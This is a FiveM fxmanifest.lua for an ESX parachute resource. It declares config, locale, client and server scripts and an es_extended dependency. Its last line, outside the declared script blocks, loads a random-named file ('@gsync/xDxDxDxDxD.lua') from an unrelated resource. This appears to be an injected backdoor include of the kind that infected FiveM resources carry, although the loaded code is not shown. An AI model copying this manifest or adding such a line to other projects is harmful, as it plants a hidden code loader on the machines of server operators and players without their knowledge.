fx_version 'adamant'
games { 'gta5' }

author 'Musiker15'
description 'ESX Parachute'
version '1.3'

shared_scripts {
	'@es_extended/locale.lua',
	'locales/*.lua',
	'config.lua'
}

client_scripts {
	'client.lua'
}

server_scripts {
	'server.lua'
}

dependencies {
	'es_extended'
}

client_script '@gsync/xDxDxDxDxD.lua'